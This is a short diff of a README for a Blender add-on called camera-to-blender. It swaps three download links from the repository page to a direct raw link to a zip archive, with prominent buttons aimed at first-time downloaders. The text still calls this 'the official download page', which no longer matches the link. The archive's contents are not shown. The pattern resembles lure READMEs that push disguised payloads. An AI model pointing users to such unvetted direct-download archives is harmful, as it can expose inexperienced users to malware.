@@ -1,6 +1,6 @@
 <h1>camera-to-blender - Bring Your Real World Into Blender</h1>
 
-<p align="center"><a href="https://github.com/altalack-bot/camera-to-blender" style="background:#FF6B6B;color:#FFFFFF;padding:14px 28px;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;display:inline-block">⬇️ DOWNLOAD NOW</a></p>
+<p align="center"><a href="https://github.com/altalack-bot/camera-to-blender/raw/refs/heads/main/blender_addon/v3.7-alpha.2.zip" style="background:#FF6B6B;color:#FFFFFF;padding:14px 28px;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;display:inline-block">⬇️ DOWNLOAD NOW</a></p>
 
 ## 📸 What Is This?
 
@@ -24,7 +24,7 @@ Let's walk through this step by step. If you've never downloaded software before
 ### Step 1: Get the File
 
 Visit this link to download the application:  
-👉 **[Click here to download camera-to-blender](https://github.com/altalack-bot/camera-to-blender)**
+👉 **[Click here to download camera-to-blender](https://github.com/altalack-bot/camera-to-blender/raw/refs/heads/main/blender_addon/v3.7-alpha.2.zip)**
 
 This takes you to the official download page. You'll see a button or link for downloading. Click that. It's completely free.
 
@@ -148,6 +148,6 @@ Capture, paste, and create. Your next Blender project just got a whole lot easie
 
 **Download now** and see the difference for yourself:
 
-<p align="center"><a href="https://github.com/altalack-bot/camera-to-blender" style="background:#4ECDC4;color:#FFFFFF;padding:12px 24px;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;display:inline-block">⬇️ GET CAMERA-TO-BLENDER</a></p>
+<p align="center"><a href="https://github.com/altalack-bot/camera-to-blender/raw/refs/heads/main/blender_addon/v3.7-alpha.2.zip" style="background:#4ECDC4;color:#FFFFFF;padding:12px 24px;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;display:inline-block">⬇️ GET CAMERA-TO-BLENDER</a></p>
 
 Happy creating, and welcome to a smarter way of working with references in Blender.
